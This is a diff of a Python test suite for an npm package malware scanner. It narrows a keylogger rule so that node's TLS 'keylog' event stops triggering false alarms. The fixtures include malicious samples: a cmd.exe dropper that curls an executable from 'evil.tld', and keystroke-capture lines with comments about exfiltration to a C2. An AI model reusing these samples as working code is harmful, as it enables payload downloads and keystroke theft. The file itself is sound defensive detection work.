@@ -36,6 +36,7 @@ from sandbox_check import (
     INSTALL_SCRIPT_HOOKS,
     INSTALL_SCRIPT_PATTERN_TABLE,
     INSTALL_SCRIPT_WARNING_PATTERNS,
+    KEYLOG_VERB_WINDOW,
     MALWARE_PATTERN_TABLE,
     MALWARE_PATTERNS,
     NETWORK_EXEC_WINDOW,
@@ -958,6 +959,22 @@ BENIGN_PACKAGE_CODE = {
         "const cp = require('child_process');\n"
         "cp.execSync('bash -ec \"npm run test\"');\n"
     ),
+    # --- F39: node's TLS session-key event. `keylog` writes an NSS keylog file
+    # so you can decrypt your OWN traffic in Wireshark; it has nothing to do
+    # with keystrokes. Verbatim from @types/node, the only package in the
+    # 1,372-package corpus the keylogger rule ever fired on.
+    "@types/node tls keylog event": (
+        'addListener(event: "keylog", listener: '
+        "(line: NonSharedBuffer, tlsSocket: tls.TLSSocket) => void): this;\n"
+        'emit(event: "keylog", line: NonSharedBuffer, tlsSocket: tls.TLSSocket): boolean;\n'
+    ),
+    # The same event subscribed to in real runtime code — the half a
+    # `.d.ts`-only fix would have left condemned.
+    "tls keylog handler in real code": (
+        "const fs = require('fs');\n"
+        "socket.on('keylog', (line) => "
+        "fs.appendFileSync(process.env.SSLKEYLOGFILE, line));\n"
+    ),
 }
 
 #: Real npm-malware shapes. Each must survive calibration as a DANGER.
@@ -1030,6 +1047,11 @@ MALICIOUS_PACKAGE_CODE = {
     "dropper in the argument array": (
         "const cp = require('child_process');\n"
         "cp.execFile('cmd.exe', ['/c', 'curl http://evil.tld/a.exe -o a.exe']);\n"
+    ),
+    # --- F39: the bare `keylog` spelling, kept but corroborated.
+    "keylog with a theft verb": (
+        "// the keylog is exfiltrated to the C2 every 60s\n"
+        "process.stdin.on('data', (k) => append(k));\n"
     ),
 }
 
@@ -1486,6 +1508,178 @@ def test_always_dangerous_descriptions_need_no_context(description):
 
     assert report.dangers, description
     assert is_dangerous_hit(description)
+
+
+# ---------------------------------------------------------------------------
+# F39 — `keylog` is a TLS event, not a keylogger
+#
+# `keylogger indicators` accepted the bare token `keylog`, which is node's own
+# TLS session-key event (`tlsSocket.on('keylog', …)`, `--tls-keylog=<file>`):
+# it writes an NSS keylog file so you can decrypt YOUR OWN traffic in
+# Wireshark. Measured over 1,372 unique installed packages (56,282 scanned
+# source files) the rule fired on 8 files, all of them `@types/node`'s
+# `tls.d.ts` and `https.d.ts` — and because it is always-dangerous, those 8
+# files made a package with no runtime code at all DO NOT INSTALL, 4 of the 7
+# danger verdicts the whole phase produced over that corpus. The bare spelling
+# now needs a theft verb following it within KEYLOG_VERB_WINDOW on the same
+# line; `keylogger`/`keylogging` still fire alone.
+# ---------------------------------------------------------------------------
+
+
+KEYLOG_DESCRIPTION = "keylogger indicators"
+
+#: The false positive, verbatim from @types/node. Every line of it was a
+#: DO-NOT-INSTALL verdict before this narrowing.
+NODE_TLS_KEYLOG_DECLARATIONS = [
+    'addListener(event: "keylog", listener: (line: NonSharedBuffer) => void): this;',
+    'emit(event: "keylog", line: NonSharedBuffer): boolean;',
+    'on(event: "keylog", listener: (line: NonSharedBuffer) => void): this;',
+    'once(event: "keylog", listener: (line: NonSharedBuffer) => void): this;',
+    'prependListener(event: "keylog", listener: '
+    "(line: NonSharedBuffer, tlsSocket: TLSSocket) => void): this;",
+    "         * 6. keylog",
+]
+
+
+@pytest.mark.parametrize("line", NODE_TLS_KEYLOG_DECLARATIONS)
+def test_node_tls_keylog_event_is_not_a_keylogger(line):
+    assert KEYLOG_DESCRIPTION not in scan_text_for_malware_patterns(line), line
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        # The event as real runtime code subscribes to it. A `.d.ts` file
+        # exclusion — the other fix considered for F39 — would have left this
+        # one condemned, which is why the pattern was narrowed instead.
+        "socket.on('keylog', (line) => fs.appendFileSync(keylogFile, line));",
+        "tlsSocket.on('keylog', (line) => stream.write(line));",
+        # The documented CLI flag, in the sentence the option exists for. This
+        # one is why the verb set is theft verbs and not `captur`/`record`:
+        # "the capture" here is a *packet* capture, and the wider set put the
+        # rule straight back on TLS-debugging prose.
+        "// run node --tls-keylog=/tmp/keys.log to decrypt the capture",
+        "// record a keylog file first, then open the capture in Wireshark",
+        "const file = process.env.SSLKEYLOGFILE;",
+        # A config key next to a logger call — the shape that keeping `logg`
+        # in this arm's verb set would have re-opened.
+        "  keylog: logger.debug('tls handshake'),",
+    ],
+)
+def test_benign_keylog_spellings_are_not_a_keylogger(code):
+    assert KEYLOG_DESCRIPTION not in scan_text_for_malware_patterns(code), code
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        # The unambiguous spellings still fire on their own.
+        "const keylogger = require('./kl');",
+        "// keylogging module, do not ship",
+        "const KeyLogger = require('./kl');",
+        # The bare token, corroborated by a following theft verb.
+        "// keylog is exfiltrated to the C2 on exit",
+        "// keylog + cookie jar, siphoned off on install",
+        "const keylog = harvestKeystrokeBuffer();",
+        # The keystrokes arm, unchanged.
+        "// captures every keystroke and records it",
+    ],
+)
+def test_real_keylogger_prose_is_still_reported(code):
+    assert KEYLOG_DESCRIPTION in scan_text_for_malware_patterns(code), code
+
+
+def test_bare_keylog_alone_is_not_enough():
+    """The narrowing, stated directly: the token needs corroboration."""
+    assert KEYLOG_DESCRIPTION not in scan_text_for_malware_patterns("const keylog = [];")
+
+
+def test_the_verb_before_keylog_is_a_priced_miss():
+    """The reverse phrasing is not covered, and that is a measured decision.
+
+    Every arm of this pattern starts with the literal `key`, so CPython skips
+    to the next `k` rather than trying the branch at every offset. An arm led
+    by the theft verbs instead starts on s/e/h and destroys that: measured over
+    25.7 MB of real bundle text, adding it took the pattern from 0.64s to
+    1.04s — 63% of its whole runtime — to buy a shape with zero true positives
+    across the 1,372-package corpus. Pinned so it stays a decision.
+    """
+    forward = "// keylog is exfiltrated on exit"
+    reverse = "// exfiltrate the keylog on exit"
+
+    assert KEYLOG_DESCRIPTION in scan_text_for_malware_patterns(forward)
+    assert KEYLOG_DESCRIPTION not in scan_text_for_malware_patterns(reverse)
+
+
+def test_every_keylogger_arm_shares_the_key_prefix():
+    """The property that makes the pattern fast, asserted rather than assumed.
+
+    A future arm that does not start with `key` costs ~1.6x on real bundles,
+    which is invisible in a unit test and obvious here.
+    """
+    regex = next(
+        pattern.regex
+        for pattern in MALWARE_PATTERN_TABLE
+        if pattern.description == KEYLOG_DESCRIPTION
+    )
+
+    arms = regex.split("|\\b")
+    assert len(arms) > 1, regex
+    for arm in arms:
+        assert arm.lstrip("\\b").startswith("key"), (arm, regex)
+
+
+def test_the_keylog_verb_check_does_not_cross_lines():
+    """A theft verb on a *later* line is a different statement."""
+    code = "socket.on('keylog', write);\nconst rows = harvestMetrics(stream);\n"
+
+    assert KEYLOG_DESCRIPTION not in scan_text_for_malware_patterns(code)
+
+
+def test_the_keylog_verb_check_is_window_bounded():
+    """Same line, but far enough away to be about something else."""
+    near = "keylog" + " " * (KEYLOG_VERB_WINDOW - 1) + "steal"
+    far = "keylog" + " " * (KEYLOG_VERB_WINDOW + 1) + "steal"
+
+    assert KEYLOG_DESCRIPTION in scan_text_for_malware_patterns(near)
+    assert KEYLOG_DESCRIPTION not in scan_text_for_malware_patterns(far)
+
+
+def test_keylog_arms_share_one_window_constant():
+    """Anti-drift: both windowed arms use KEYLOG_VERB_WINDOW.
+
+    The `keystrokes` arm and the `keylog` arm are the same idea — a weak noun
+    corroborated by a verb — so a window edited in one place and not the other
+    would silently make them disagree.
+    """
+    regex = next(
+        pattern.regex
+        for pattern in MALWARE_PATTERN_TABLE
+        if pattern.description == KEYLOG_DESCRIPTION
+    )
+
+    assert regex.count("{0,%d}" % KEYLOG_VERB_WINDOW) == 2, regex
+
+
+def test_a_declarations_only_package_is_no_longer_condemned():
+    """The verdict F39 named, end to end: @types/node was DO NOT INSTALL.
+
+    Asserted through `classify_malware_hits` rather than the regex alone,
+    because the wrong output was a *verdict* — one always-dangerous hit in a
+    package containing no runtime code at all.
+    """
+    tls_declarations = "\n".join(NODE_TLS_KEYLOG_DECLARATIONS)
+
+    report = classify_malware_hits(
+        [
+            (path, description)
+            for path in ("tls.d.ts", "https.d.ts")
+            for description in scan_text_for_malware_patterns(tls_declarations)
+        ]
+    )
+
+    assert report.dangers == []
+    assert KEYLOG_DESCRIPTION not in report.counts
 
 
 @pytest.mark.parametrize("description", sorted(CAPABILITY_DESCRIPTIONS))
